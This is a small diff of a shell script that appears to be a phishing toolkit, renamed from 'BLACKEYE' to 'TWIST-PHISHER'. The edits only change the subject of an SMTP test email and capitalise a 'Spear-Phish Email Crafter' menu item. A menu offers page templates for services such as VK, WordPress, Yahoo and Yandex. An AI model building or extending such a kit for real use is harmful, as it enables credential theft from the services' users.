@@ -281,7 +281,7 @@ EOF
     cat > "$test_tmp" << EOF
 From: <$FROM_EMAIL>
 To: <$FROM_EMAIL>
-Subject: BLACKEYE SMTP test
+Subject: TWIST-PHISHER SMTP TEST
 
 Test connection for educational demonstration.
 EOF
@@ -497,7 +497,7 @@ menu() {
         printf "%s [28]%s VK         %s[29]%s WordPress  %s[30]%s Yahoo\n" "$G" "$N" "$G" "$N" "$G" "$N"
         printf "%s [31]%s Yandex     %s[32]%s InstaFol   %s[33]%s Custom\n" "$G" "$N" "$G" "$N" "$G" "$N"
         printf "%s ─────────────────────────────────────────────%s\n" "$Y" "$N"
-        printf "%s [E]%s  Spear-Phish Email Crafter%s\n" "$M" "$W" "$N"
+        printf "%s [E]%s  SPEAR-PHISH EMAIL CRAFTER%s\n" "$M" "$W" "$N"
         printf "%s [Q]%s  Exit%s\n\n" "$R" "$N"
 
         read -p " ${C}[*] SELECT: ${N}" choice
